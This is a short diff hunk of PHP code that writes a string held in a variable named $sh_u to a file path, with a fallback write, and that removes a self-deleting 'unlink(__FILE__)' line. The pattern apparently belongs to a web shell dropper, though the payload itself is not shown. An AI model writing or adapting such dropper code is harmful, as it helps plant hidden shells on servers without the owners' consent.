@@ -49,5 +49,4 @@ if ($fu === false) {
     if ($bytes_written === false || $bytes_written < strlen($sh_u)) {
         @file_put_contents($path_u, $sh_u);
     }
-}
-unlink(__FILE__)
+} 
